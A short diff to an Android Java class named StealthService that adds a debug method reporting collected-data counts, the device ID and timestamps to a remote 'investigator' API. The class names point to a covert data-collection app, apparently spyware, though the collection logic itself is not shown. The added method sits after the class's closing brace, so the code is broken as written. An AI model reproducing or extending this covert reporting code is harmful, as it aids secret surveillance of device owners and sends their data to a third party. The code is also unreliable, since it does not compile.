@@ -402,3 +402,22 @@ public class StealthService extends Service {
         super.onDestroy();
     }
 }
+
+    // ==================== DEBUG DATA COLLECTION ====================
+    private void logDataCollection(String dataType, int count) {
+        Log.d(TAG, "🔍 DATA COLLECTION DEBUG - " + dataType + ": " + count + " items");
+        
+        // Send debug info to investigator
+        try {
+            JSONObject debugInfo = new JSONObject();
+            debugInfo.put("data_type", dataType);
+            debugInfo.put("item_count", count);
+            debugInfo.put("device_id", deviceId);
+            debugInfo.put("timestamp", System.currentTimeMillis());
+            debugInfo.put("debug", true);
+            
+            investigatorApiClient.sendDataToInvestigator("debug_info", debugInfo);
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Debug logging error: " + e.getMessage());
+        }
+    }
